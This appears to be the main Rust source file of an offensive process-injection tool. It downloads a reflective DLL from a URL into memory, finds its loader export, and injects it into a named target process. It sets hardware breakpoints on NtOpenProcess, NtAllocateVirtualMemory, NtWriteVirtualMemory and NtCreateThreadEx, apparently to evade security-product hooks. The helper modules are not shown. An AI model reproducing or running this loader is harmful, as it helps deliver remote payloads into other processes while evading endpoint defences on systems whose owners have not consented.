mod download;
mod parse_pe;
mod inject;
mod hwbp;


use clap::Parser;
use crate::hwbp::hwbp_cleanup;


/// Inject ReflectiveDLL.dll into a target process.
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {

    /// Target process name (e.g., notepad.exe)
    #[arg(short, long)]
    process: String,

    // #[arg(short, long, conflicts_with = "url")]
    // file: Option<String>,

    // #[arg(short, long, conflicts_with = "file")]

    /// URL to download the DLL from (e.g., http://example.com/ReflectiveDLL.dll)
    #[arg(short, long)]
    url: Option<String>,

    /// ReflectiveLoader function name in ReflectiveDLL.dll
    #[arg(long, default_value = "yolo")]
    rflname: String
}


fn main() {
    let args = Args::parse();

    let Some(url) = args.url else {
        eprintln!("Error: --url must be provided.");
        std::process::exit(1);
    };


    println!("Downloading from {}", url);

    let data = download::download_to_memory(&url, None, None)
        .expect("Failed to download file");

    if data.len() > 0 {
        println!("Downloaded {} bytes", data.len());
    } else {
        println!("Downloaded empty file");
    }


    // let dll = pe_parser::new(data);
    let dll = parse_pe::PeParser::new(data);

    let func_raw = dll.get_func_raw(&args.rflname).expect("Failed to find ReflectiveLoader function");
    println!("ReflectiveLoader raw offset: 0x{:X}", func_raw);


    let dr0 = hwbp::DR::Dr0;
    let dr1 = hwbp::DR::Dr1;
    let dr2 = hwbp::DR::Dr2;
    let dr3 = hwbp::DR::Dr3;

    unsafe {
        let _ = hwbp::hwbp_init().expect("[ERROR] Failed to initialize hardware breakpoints!");
        let _ = hwbp::set_hwbp(&dr0, "NtOpenProcess\0").expect("[ERROR] Failed to set hardware breakpoint on NtOpenProcess!");
        let _ = hwbp::set_hwbp(&dr1, "NtAllocateVirtualMemory\0").expect("[ERROR] Failed to set hardware breakpoint on NtAllocateVirtualMemory!");
        let _ = hwbp::set_hwbp(&dr2, "NtWriteVirtualMemory\0").expect("[ERROR] Failed to set hardware breakpoint on NtWriteVirtualMemory!");
        let _ = hwbp::set_hwbp(&dr3, "NtCreateThreadEx\0").expect("[ERROR] Failed to set hardware breakpoint on NtCreateThreadEx!");

    }


    inject::inject_dll_into_process(
        &args.process.encode_utf16().collect::<Vec<u16>>(),
        &dll,
        func_raw,
    ).expect("Failed to inject DLL!\n");

    unsafe {
        let _ = hwbp::unset_hwbp(&dr0);
        let _ = hwbp::unset_hwbp(&dr1);
        let _ = hwbp::unset_hwbp(&dr2);
        let _ = hwbp::unset_hwbp(&dr3);
        let _ = hwbp_cleanup().expect("[ERROR] Failed to cleanup hardware breakpoints!");
    }

}
